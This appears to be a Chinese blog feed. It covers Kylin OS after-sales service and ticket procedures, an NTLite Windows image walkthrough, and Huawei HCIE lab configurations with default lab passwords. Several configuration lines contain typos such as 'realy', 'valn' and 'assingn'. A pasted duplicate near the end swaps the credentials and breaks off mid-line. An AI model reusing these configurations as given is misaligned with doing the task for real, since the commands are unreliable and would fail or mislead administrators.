主动服务: 高级工程师现场服务5人天起，现场|远程 | 驻场服务: 年度起，现场 </span><span class="hljs-comment"># 3.定制服务：</span><span class="hljs-comment"># 4.厂商服务：OEM、ODM、ISV、IHV等厂家的服务；400专线入口，7X9</span><span class="hljs-comment"># 5.代理服务：面向分销代理用户（中建材）；</span><span class="hljs-comment"># 6.Centos服务接管：Centos6: 2026年11月30日 | Centos7: 2028年6月30日 | Centos8: 2028年6月30日</span><span class="hljs-comment"># 7.迁移服务：Centos迁移到麒麟服务器操作系统；迁移咨询（20-100套，一年） 和 迁移实施</span><span class="hljs-comment">## 服务鉴权说明</span><span class="hljs-comment"># 1. 索要服务识别信息（服务序列号），确认用户的身份身份是否合法。 不可以主动告诉用户的信息，只可以确认服务期限。</span><span class="hljs-comment"># 2. 鉴权工具：微信公众号；售后管理系统-鉴权查询(PC/APP) </span><span class="hljs-comment"># 3. 鉴权流程：服务发起-信息收集-鉴权查询-信息判定-任务派发-服务引导</span><span class="hljs-comment">## 服务级别管理</span><span class="hljs-comment"># 1. SLA:(Service Level Agreement), 服务等级协议 | OLA:(Operation Level Agreement), 操作级别协议</span><span class="hljs-comment"># 2. 服务受理基本要求： 技术问题服务支持原则：流程处理流程要求；问题处理优先级要求</span><span class="hljs-comment"># 3. OLA要求（通用）：P1是7X24小时；服务台待受理(0.5h),服务台受理中(0.5h),一线处理中(1.5h),二线待受理(0.5),二线处理中(8h),三线处理中(109.5h)</span><span class="hljs-comment"># 4. 级别判断与调整</span><span class="hljs-comment"># 4.1 紧急：对项目进展存在严重影响或给客户造成重大风险如无法及时处理会导致风险范围扩大；未及时处理会影响客户业务运行，存在导致业务中断等重大风险；客户明确表示问题紧急并告知影响风险；</span><span class="hljs-comment"># 4.2 一般：客户无特殊要求和问题无潜在风险扩大的情况；</span><span class="hljs-comment"># 4.3 较低：经客户评估该问题可延后处理或推迟处理；未对客户产生实际业务影响或通过临时方案已经解决客户侧问题。</span><span class="hljs-comment"># 5. P1级别判断：</span><span class="hljs-comment"># 5.1: 影响范围：超过50台或者50人；</span><span class="hljs-comment"># 5.2：业务影响面：重点核心业务系统发生了宕机、关键业务数据丢失、关机业务中断等</span><span class="hljs-comment"># 5.3：影响的人员：属于重点的核心人员或高管。利如CEO,CTO,CFO或签约关键人</span><span class="hljs-comment"># 5.4：安全事件：属于较大安全事件及以上的安全事件</span></code></pre><h2 id="工单系统使用"><a href="#工单系统使用" class="headerlink" title="工单系统使用"></a>工单系统使用</h2><h3 id="麒麟软件售后服务管理系统的使用"><a href="#麒麟软件售后服务管理系统的使用" class="headerlink" title="麒麟软件售后服务管理系统的使用"></a>麒麟软件售后服务管理系统的使用</h3><pre><code class="hljs bash"><span class="hljs-comment">## 业务与流程</span><span class="hljs-comment"># 1. 服务流程标准流程-五大节点：请求单(呼叫中心|客户自助|1现技服|销售人员|客户经理)-集中式服务台(售后支持|非售后)-L1资源-L2资源池-L3资源池；</span><span class="hljs-comment"># 2. 售后业务：售后业务特指销售合同标识，需要为合同内产品提供售后保障服务，及合同产品为服务产品的业务类型；</span><span class="hljs-comment"># 3. 非售后业务：售前阶段技术支持、售中问题技术支持、超合同范围；</span><span class="hljs-comment"># 4. 服务方式：上门（售前服务单|超合同范围服务单|高级服务-主动服务单）;远程服务(基础|售中服务单|高级服务-问题解决单|上门的全部)</span><span class="hljs-comment"># 5. 当选择现场支持后，此工单不能再升级二线，如需升级二线，需另创建新的工单生活给二线队列</span><span class="hljs-comment"># 6. 主要的角色与虚拟组: 请求收集人(麒麟内部员工)、服务台角色(麒麟内部经理)、L1技术支持工程师、L2技术支持工程师、L3支持（研发）</span><span class="hljs-comment"># 7. 虚拟组: 为了更好提供业务流程流程性及便捷胯部门协作，</span><span class="hljs-comment"># 8. 服务时效-服务级别与OLA: P1-重大停机故障、P2-性能严重下降、P3-普通故障、P4-低</span><span class="hljs-comment"># 9. 工单状态：已开启(请求单-经过服务台-&gt;服务单)、已解决(受理人确认问题已解决)、已关闭（已满调）</span><span class="hljs-comment"># 10. 请求收集说明：400客服、销售人员、售前工程师、售后工程师、客户自助</span><span class="hljs-comment">## 操作演示</span><span class="hljs-comment"># 1. 登录环境：统一平台，APP售后服务</span><span class="hljs-comment"># 2. 流程演示：</span><span class="hljs-comment"># 2.1 基础服务单：创建请求单-服务台判断与派发-创建基础服务单-L1受理-完成服务单-升级L2</span><span class="hljs-comment"># 2.2 高级服务-主动服务：创建请求单、服务台判断与派发-创建高级服务单-使用App进行现场服务-服务台扣减-完成服务单</span><span class="hljs-comment"># 2.3 售前阶段技术服务-上门：创建请求单-服务台判断与派发-创建售前节点技术支持单（现场）-使用App进行现场服务-完成服务单</span><span class="hljs-comment"># 2.4 售前阶段服务支持-远程：创建请求单-服务台判断与派发-创建售前阶段技术支持单(远程)-L1处理-完成服务单-升级L2</span><span class="hljs-comment"># 3. 日常工作记录：用于记录日常性工作及相应工时，如学习、培训、会议、项目实施工作等事务性内容</span><span class="hljs-comment">## 常见问题处理建议</span><span class="hljs-comment"># 1. 上门模式服务单是否还可以升级L2线？不可以。</span><span class="hljs-comment"># 2. 选择上门支持后，技服人员在电脑端点击抵达上门为什么没有反应？当选择上门支持后，技服人员必须通过APP进行操作。</span><span class="hljs-comment"># 3. 需关注：为关闭工单</span></code></pre><h3 id="服务人员服务过程信息录入"><a href="#服务人员服务过程信息录入" class="headerlink" title="服务人员服务过程信息录入"></a>服务人员服务过程信息录入</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. 工单流转概述：创建请求单-(升级服务台)-&gt;服务台受理-(创建服务单)-&gt;工单处理--&gt;工单已解决-(满调)-&gt;工单关闭</span><span class="hljs-comment"># 2. 服务单创建要求：</span><span class="hljs-comment"># 2.1 标题: (涉及跨部门的需要注明“协同”（例如跨区域、行业、客服）)客户单位名称【项目名称（非项目实施阶段可不填，必须和CRM立项名称一致）】+问题现象描述）。（示例：（协同）麒麟软件【信息管理平台迁移项目】-私有化软件商店导入Kirin9a0商业源报XXXX错误）</span><span class="hljs-comment"># 2.2 客户信息：公司名称</span><span class="hljs-comment"># 2.3 姓名：填写服务对象真实对接联系人姓名和电话。例如：张三（总集成）</span><span class="hljs-comment"># 2.4 请求类型：售后：针对项目实施部署完成后提供标准服务产品范围以内的服务支持，使用本类型（需有明确服务序列号信息）</span><span class="hljs-comment"># 2.5 行业属性选择：当前行业相关人员创建时需要选择，选择时按照实际行业划分选择，非行业人员默认不填写。</span><span class="hljs-comment"># 2.5 区域熟悉选择：安装客户所对应区域进行选择，不确定的可以选择北京。</span><span class="hljs-comment"># 2.6 请求信息：咨询类，售后类</span><span class="hljs-comment"># 2.7 问题类型：根据反馈问题的实际内容选择对应场景类别，类别选择时候需要基于当前场景信息选择到最后一级。</span><span class="hljs-comment"># 2.8 问题描述：问题描述本着真实全面，应秉持3W1H（When, where, what）</span><span class="hljs-comment"># 2.9 系统环境：物理机/虚拟机/容器</span><span class="hljs-comment"># 2.10 网络环境：外网/私有网络/无网络</span><span class="hljs-comment"># 2.11 硬件环境：包含具体使用硬件机器型号、品牌、CPU型号、内存、硬盘等硬件信息</span><span class="hljs-comment"># 2.12 软件环境（含第三方软件）：包含系统环境信息，安装的第三方软件信息等软件相关信息；</span><span class="hljs-comment"># 2.13 问题现象详细模式：需详细说明在什么场景下出现了什么问题，问题的现象是什么（描述需完整，如有日志、图片等新消息可通过附件形式上传）</span><span class="hljs-comment"># 2.14 问题影响范围：需说明以上问题发生后对用户产生的实际影响，影响的范围有哪些，实际产生的影响程度是什么（需详细说明，便于处理人员到实际产生的影响）</span><span class="hljs-comment"># 2.15 解决方案：需说明针对该问题我们做了什么动作，分析的结果是什么，根据该结果给出解决方案是什么，如果无法直接解决的需要记录当前已经排查的信息，分析的结果</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISO</title>
      <link href="/2024/08/23/CISO/"/>
      <url>/2024/08/23/CISO/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NTLite</title>
      <link href="/2024/07/28/NTLite/"/>
      <url>/2024/07/28/NTLite/</url>
      
        <content type="html"><![CDATA[<h1 id="NTLite定制母盘"><a href="#NTLite定制母盘" class="headerlink" title="NTLite定制母盘"></a>NTLite定制母盘</h1><ol><li>添加镜像</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817174856.png" alt="添加镜像"></p><p>添加镜像</p><ol><li>加载指定版本</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817175034.png" alt="加载指定版本"></p><p>加载指定版本</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817175207.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817175628.png" alt="img"></p><ol><li>更新系统更新</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817181247.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817181400.png" alt="img"></p><ol><li>移除组件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817182602.png" alt="img"></p><pre><code class="hljs shell">Feedback HubGet HelpOfficeOneNoteSkypeXbox Game Bar PluginXbox Game BarXbox Game Speech WindowXbox TCUIXboxYour Phone提示(Win10 1607之前叫&quot;入门&quot;)Microsoft PayMicrosoft People零售演示内容Windows客户体验改善计划CEIP(SQM)钱包支付OneDrive(微软云盘)language-shell复制代码</code></pre><ol><li>功能设置</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817185546.png" alt=".net"></p><p>.net</p><ol><li>桌面设置</li></ol><p>禁止 Meet Now(立即开会)<br>禁止 商店固定到任务栏<br>禁止 人脉<br>禁止 咨询和兴趣<br>禁止 允许帮助提升用户体验<br>禁止 允许应用使用用户的广告标识了解对各应用的体验<br>禁止 反馈频率<br>启动 计算机桌面图标<br>打开文件资源管理器时打开 此电脑</p><ol><li>点击应用</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817191020.png" alt="img"></p><ol><li>到处镜像和保存配置文件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817191239.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817191308.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817192100.png" alt="img"></p><h1 id="准备系统封装环境"><a href="#准备系统封装环境" class="headerlink" title="准备系统封装环境"></a>准备系统封装环境</h1><h1 id="母盘安装"><a href="#母盘安装" class="headerlink" title="母盘安装"></a>母盘安装</h1><h1 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a>系统优化</h1><ol><li><p>更新系统</p></li><li><p>关闭通知</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817203411.png" alt="img"></p></li><li><p>打开远程</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817203610.png" alt="img"></p></li><li><p>关闭自动播放</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817204031.png" alt="img"></p></li><li><p>隐私优化</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817203742.png" alt="img"></p></li><li><p>自定义开始菜单</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817204411.png" alt="img"></p></li><li><p>任务栏</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817204745.png" alt="img"></p></li><li><p>修改时间和时区</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817205119.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817205207.png" alt="img"></p></li><li><p>安装输入法</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240817205822.png" alt="img"></p></li></ol><h1 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h1><h1 id="系统封装"><a href="#系统封装" class="headerlink" title="系统封装"></a>系统封装</h1>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HCIE Lab</title>
      <link href="/2024/05/06/HCIE%20Lab/"/>
      <url>/2024/05/06/HCIE%20Lab/</url>
      
        <content type="html"><![CDATA[<h1 id="HCIE-LAB（有价值的项目）"><a href="#HCIE-LAB（有价值的项目）" class="headerlink" title="HCIE LAB（有价值的项目）"></a>HCIE LAB（有价值的项目）</h1><blockquote><ol><li>X园区：传统网改造及升级</li><li>Y园区：iMaster NCE-Campus SD-WAN 部署</li><li>Z园区：广域网承载及设计</li><li>Python网络自动化</li><li>网络八股文</li></ol></blockquote><h2 id="X园区：传统网改造及升级"><a href="#X园区：传统网改造及升级" class="headerlink" title="X园区：传统网改造及升级"></a>X园区：传统网改造及升级</h2><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ol><li>账号密码</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 通用的密码</span>admin/Admin@123<span class="hljs-comment"># 防火墙 X_T1_FW1</span>admin/Huawei@123</code></pre><ol start="2"><li>IP规划</li></ol><pre><code class="hljs bash"><span class="hljs-comment">## 公网 网段:10.255.X.0/24 8根线, x取值1-8, 本段.1, 对端的地址都是.254</span><span class="hljs-comment"># X_Export1 X_Export2   Y_Export    Store_Export</span>10.255.1.1  10.255.3.1  10.255.5.1  10.255.7.110.255.2.1  10.255.4.1  10.255.6.1  10.255.8.1<span class="hljs-comment">## X园区内部 网段:10.1.X.X/X</span><span class="hljs-comment"># loopback接口  10.1.0.X/32</span><span class="hljs-comment"># X_Export1 X_Export2   X_Core&#123;P,E,G&#125;   X_T1_AGG1   X_T1_AGG2   X_FW&#123;E,G&#125;       X_AC</span>10.1.0.1    10.1.0.2    10.1.0.&#123;3,4,5&#125;  10.1.0.6    10.1.0.7    10.1.0.&#123;8.9&#125;    10.1.0.11<span class="hljs-comment"># 设备互联地址  10.1.200.X/30 从上到下 从左到右 网段0,4,8,12,16,20,24,28,32</span><span class="hljs-comment"># E1_C=1_2  E2_C=5_6    C_AC=9_10   C_FW=&#123;13_14,17_18,21_22,25_26&#125;  C_T1AGG1=29_30      C_T2AGG1=33_34</span><span class="hljs-comment"># vlan201   vlan202     vlan203     vlan&#123;204,205,206,207&#125;           vlan208             vlan209   </span>服务器 10.1.60.0/24   vlan60</code></pre><h3 id="1-设置密码和初始化"><a href="#1-设置密码和初始化" class="headerlink" title="1. 设置密码和初始化"></a>1. 设置密码和初始化</h3><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_AC</span>system-viewuser-interface console 0  idle-time 0 0  authentication-mode password  <span class="hljs-built_in">set</span> authentication password cipher  Enter New Password...  <span class="hljs-built_in">return</span>  quit<span class="hljs-comment"># X_T2_ACC1 / X_T2_ACC2 / X_T2_AGG1</span>system-viewuser-interface console 0  idle-time 0 0  authentication-mode password  <span class="hljs-built_in">set</span> authentication password cipher Huawei@123  <span class="hljs-built_in">return</span>  quit<span class="hljs-comment"># Other</span>system-viewuser-interface console 0  idle-time 0 0  quitlldp <span class="hljs-built_in">enable</span>undo info <span class="hljs-built_in">enable</span></code></pre><h3 id="2-1-配置Eth-Trunk-Trunk-Hybrid-Access-Loopback接口"><a href="#2-1-配置Eth-Trunk-Trunk-Hybrid-Access-Loopback接口" class="headerlink" title="2.1 配置Eth-Trunk &#x2F; Trunk &#x2F; Hybrid &#x2F; Access &#x2F; Loopback接口"></a>2.1 配置Eth-Trunk &#x2F; Trunk &#x2F; Hybrid &#x2F; Access &#x2F; Loopback接口</h3><h3 id="2-2-绑定vpn-instance-配置接口IP地址-开启DHCP"><a href="#2-2-绑定vpn-instance-配置接口IP地址-开启DHCP" class="headerlink" title="2.2 绑定vpn-instance &#x2F; 配置接口IP地址 &#x2F; 开启DHCP"></a>2.2 绑定vpn-instance &#x2F; 配置接口IP地址 &#x2F; 开启DHCP</h3><ol><li>X_T_Export</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># X_T_Export2</span>dis lldp nei briefinterface LoopBack 0  ip add 10.1.0.2 32interface GigabitEthernet 0/0/1  ip add 10.1.200.5 30interface GigabitEthernet 0/0/0  ip add 10.255.3.1 24interface GigabitEthernet 0/0/2  ip add 10.255.4.1 24dis ip int brief</code></pre><ol start="2"><li>X_T_CROE</li></ol><pre><code class="hljs bash">dhcp <span class="hljs-built_in">enable</span>vlan batch 51 to 55 60 100 to 105 201 to 209dis port vlaninterface GigabitEthernet 0/0/2  port link-type access  port default vlan 202interface GigabitEthernet 0/0/3  port trunk allow-pass vlan 51 to 55 101 to 105interface GigabitEthernet 0/0/4  port link-type trunk  port trunk allow-pass vlan 204 205  undo port trunk allow-pass vlan 1interface GigabitEthernet 0/0/5  port link-type trunk  port trunk allow-pass vlan 206 207  undo port trunk allow-pass vlan 1interface GigabitEthernet 0/0/6  port link-type access  port default vlan 60interface Eth-Trunk 2  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 100 209  dis lldp nei brief  trunkport GigabitEthernet 0/0/9 to 0/0/10<span class="hljs-comment">#</span>ip vpn-instance Employee  route-distinguisher 65001:1    quit  quitip vpn-instance Guest  route-distinguisher 65001:2    quit  quit<span class="hljs-comment"># </span>display current-configuration configuration ip-pool...ip pool wired_finance1  vpn-instance Employee  ...<span class="hljs-comment">#</span>interface lo1  ip binding vpn-instance Employee  ip add 10.1.0.4 32interface lo2  ip binding vpn-instance Guest  ip add 10.1.0.5 32interface vlanif 202  ip add 10.1.200.6 30interface vlanif 204  ip add 10.1.200.13 30interface vlanif 205  ip add 10.1.200.17 30interface vlanif 206  ip binding vpn-instance Employee  ip add 10.1.200.21 30interface vlanif 207  ip binding vpn-instance Guest  ip add 10.1.200.25 30interface vlanif 208  ip binding vpn-instance Employee  ip add 10.1.200.29 30  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 209  ip binding vpn-instance Employee  ip add 10.1.200.33 30  dhcp <span class="hljs-keyword">select</span> global<span class="hljs-comment">#</span>interface vlanif 51  ip binding vpn-instance Employee  ip add 10.1.51.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 52  ip binding vpn-instance Employee  ip add 10.1.52.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 53  ip binding vpn-instance Employee  ip add 10.1.53.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 54  ip binding vpn-instance Employee  ip add 10.1.54.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 55  ip binding vpn-instance Employee  ip add 10.1.55.254 24  dhcp <span class="hljs-keyword">select</span> global<span class="hljs-comment">#</span>interface vlanif 60  ip binding vpn-instance Employee  ip add 10.1.60.254 24<span class="hljs-comment">#</span>interface vlanif 101  ip binding vpn-instance Guest  ip add 10.1.101.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 102  ip binding vpn-instance Guest  ip add 10.1.102.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 103  ip binding vpn-instance Guest  ip add 10.1.103.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 104  ip binding vpn-instance Guest  ip add 10.1.104.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 105  ip binding vpn-instance Guest  ip add 10.1.105.254 24  dhcp <span class="hljs-keyword">select</span> global</code></pre><ol start="3"><li>X_T1</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_AGG1 </span>dhcp <span class="hljs-built_in">enable</span>vlan batch 11 to 15 21 to 25dis port vlaninterface Eth-trunk 2  port hybrid tagged vlan 11 to 15 21 to 25 100interface Eth-trunk 3  port hybrid tagged vlan 11 to 15 21 to 25 100<span class="hljs-comment">#</span>dis ip int briefinterface vlanif 11  ip add 10.1.11.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 12  ip add 10.1.12.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 13  ip add 10.1.13.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 14  ip add 10.1.14.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 15  ip add 10.1.15.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 21  ip add 10.1.21.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 22  ip add 10.1.22.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 23  ip add 10.1.23.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 24  ip add 10.1.24.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 25  ip add 10.1.25.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29dis ip int  brief<span class="hljs-comment"># X_T1_ACC1</span>vlan batch 11 to 15 21 to 25 100interface Eth-trunk 1  port trunk allow-pass vlan 11 to 15 21 to 25 100dis port vlan<span class="hljs-comment"># X_T1_ACC2</span>vlan batch 11 to 15 21 to 25 100interface Eth-trunk 1  port trunk allow-pass vlan 11 to 15 21 to 25 100 interface GigabitEthernet 0/0/1 port hybrid pvid vlan 24 port hybrid untagged vlan 24dis port vlan</code></pre><ol start="4"><li>X_T2</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># X_T2_AGG1</span>dhcp <span class="hljs-built_in">enable</span>vlan batch 31 to 35 41 to 45 100 209interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 100 209  dis lldp nei brief  trunkport GigabitEthernet 0/0/5 to 0/0/6interface Eth-Trunk 2  mode lacp-static  port hybrid tagged vlan 31 to 35 41 to 45 100  trunkport GigabitEthernet 0/0/1 to 0/0/2interface Eth_Trunk 3  mode lacp-static  port hybrid tagged vlan 31 to 35 41 to 45 100  trunkport GigabitEthernet 0/0/3 to 0/0/4dis port vlan<span class="hljs-comment">#</span>dis ip int brierinterface vlanif 209  ip add 10.1.200.34 30interface vlanif 31  ip add 10.1.31.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 32  ip add 10.1.32.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 33  ip add 10.1.33.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 34  ip add 10.1.34.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 35  ip add 10.1.35.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 41  ip add 10.1.41.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 42  ip add 10.1.42.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 43  ip add 10.1.43.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 44  ip add 10.1.44.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 45  ip add 10.1.45.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33<span class="hljs-comment"># X_T2_ACC1</span>vlan batch 31 to 35 41 to 45 100interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 31 to 35 41 to 45 100  dis lldp nei brief  trunkport GigabitEthernet 0/0/23 to 0/0/24interface GigabitEthernet 0/0/1 port hybrid pvid vlan 33 port hybrid untagged vlan 33<span class="hljs-comment"># X_T2_ACC2</span>vlan batch 31 to 35 41 to 45 100interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 31 to 35 41 to 45 100  dis lldp nei brief  trunkport GigabitEthernet 0/0/23 to 0/0/24interface GigabitEthernet 0/0/22  port link-type access  port default vlan 100</code></pre><ol start="5"><li>X_T1_FW</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_FW</span>vlan batch 204 to 207interface GigabitEthernet 1/0/1  portswitch  port link-type trunk  port trunk allow-pass vlan 204 205  undo port trunk allow-pass vlan 1interface GigabitEthernet 1/0/2  portswitch  port link-type trunk  port trunk allow-pass vlan 206 207  undo port trunk allow-pass valn 1interface lo1interface lo2vsys <span class="hljs-built_in">enable</span>vsys name Employee  assign vlan 204  assign vlan 206  assign interface LoopBack 1vsys name Guest  assign vlan 205  assign vlan 207  assingn interface LoopBack 2interface lo1  ip add 10.1.0.8 32interface lo2  ip add 10.1.0.9 32interface vlanif 204  ip add 10.1.200.14 30interface vlanif 205  ip add 10.1.200.18 30interface vlanif 206  ip add 10.1.200.22 30interface vlanif 207  ip add 10.1.200.26 30interface Virtual-<span class="hljs-keyword">if</span> 1  ip add 10.1.200.254 32interface Virtual-<span class="hljs-keyword">if</span> 2  ip add 10.1.200.253 32switch vsys Guest  sys    firewall zone trust      add interface vlanif 207    firewall zone untrust      add interface vlanif 205      add interface virtual-if 2    security-policy      rule name ospf        source-zone trust        source-zone untrust        source-zone <span class="hljs-built_in">local</span>        destination-zone <span class="hljs-built_in">local</span>        destination-zone untrust        destination-zone trust        service ospf        action permitswitch vsys Employee  sys    firewall zone trust      add interface vlanif 206     firewall zone untrust      add interface vlanif 204       add interface virtual-if 1    security-policy      rule name ospf        source-zone trust        source-zone untrust        source-zone <span class="hljs-built_in">local</span>        destination-zone <span class="hljs-built_in">local</span>        destination-zone untrust        destination-zone trust        service ospf        action permit</code></pre><h3 id="3-1-配置-静态路由-ip-prefix-vpn-instance-vsys"><a href="#3-1-配置-静态路由-ip-prefix-vpn-instance-vsys" class="headerlink" title="3.1 配置 静态路由 &#x2F; ip-prefix &#x2F; vpn-instance &#x2F; vsys"></a>3.1 配置 静态路由 &#x2F; ip-prefix &#x2F; vpn-instance &#x2F; vsys</h3><h3 id="3-2-配置-OSPF"><a href="#3-2-配置-OSPF" class="headerlink" title="3.2 配置 OSPF"></a>3.2 配置 OSPF</h3><ol><li>X_T_Export</li></ol><pre><code class="hljs bash">&lt;&gt;HCIE Lab置顶  网络发布时间 : 2024-05-06 19:42字数:34.7k 阅读 :398HCIE LAB（有价值的项目）X园区：传统网改造及升级Y园区：iMaster NCE-Campus SD-WAN 部署Z园区：广域网承载及设计Python网络自动化网络八股文X园区：传统网改造及升级环境信息账号密码<span class="hljs-comment"># 通用的密码</span>admin/Huawei@123<span class="hljs-comment"># 防火墙 X_T1_FW1</span>admin/Admin@123IP规划<span class="hljs-comment">## 公网 网段:10.255.X.0/24 8根线, x取值1-8, 本段.1, 对端的地址都是.254</span><span class="hljs-comment"># X_Export1 X_Export2   Y_Export    Store_Export</span>10.255.1.1  10.255.3.1  10.255.5.1  10.255.7.110.255.2.1  10.255.4.1  10.255.6.1  10.255.8.1<span class="hljs-comment">## X园区内部 网段:10.1.X.X/X</span><span class="hljs-comment"># loopback接口  10.1.0.X/32</span><span class="hljs-comment"># X_Export1 X_Export2   X_Core&#123;P,E,G&#125;   X_T1_AGG1   X_T1_AGG2   X_FW&#123;E,G&#125;       X_AC</span>10.1.0.1    10.1.0.2    10.1.0.&#123;3,4,5&#125;  10.1.0.6    10.1.0.7    10.1.0.&#123;8.9&#125;    10.1.0.11<span class="hljs-comment"># 设备互联地址  10.1.200.X/30 从上到下 从左到右 网段0,4,8,12,16,20,24,28,32</span><span class="hljs-comment"># E1_C=1_2  E2_C=5_6    C_AC=9_10   C_FW=&#123;13_14,17_18,21_22,25_26&#125;  C_T1AGG1=29_30      C_T2AGG1=33_34</span><span class="hljs-comment"># vlan201   vlan202     vlan203     vlan&#123;204,205,206,207&#125;           vlan208             vlan209   </span>服务器 10.1.60.0/24   vlan601. 设置密码和初始化<span class="hljs-comment"># X_T1_AC</span>system-viewuser-interface console 0  idle-time 0 0  authentication-mode password  <span class="hljs-built_in">set</span> authentication password cipher  Enter New Password...  <span class="hljs-built_in">return</span>  quit<span class="hljs-comment"># X_T2_ACC1 / X_T2_ACC2 / X_T2_AGG1</span>system-viewuser-interface console 0  idle-time 0 0  authentication-mode password  <span class="hljs-built_in">set</span> authentication password cipher Huawei@123  <span class="hljs-built_in">return</span>  quit<span class="hljs-comment"># Other</span>system-viewuser-interface console 0  idle-time 0 0  quitlldp <span class="hljs-built_in">enable</span>undo info <span class="hljs-built_in">enable</span>2.1 配置Eth-Trunk / Trunk / Hybrid / Access / Loopback接口2.2 绑定vpn-instance / 配置接口IP地址 / 开启DHCPX_T_Export<span class="hljs-comment"># X_T_Export2</span>dis lldp nei briefinterface LoopBack 0  ip add 10.1.0.2 32interface GigabitEthernet 0/0/1  ip add 10.1.200.5 30interface GigabitEthernet 0/0/0  ip add 10.255.3.1 24interface GigabitEthernet 0/0/2  ip add 10.255.4.1 24dis ip int briefX_T_CROEdhcp <span class="hljs-built_in">enable</span>vlan batch 51 to 55 60 100 to 105 201 to 209dis port vlaninterface GigabitEthernet 0/0/2  port link-type access  port default vlan 202interface GigabitEthernet 0/0/3  port trunk allow-pass 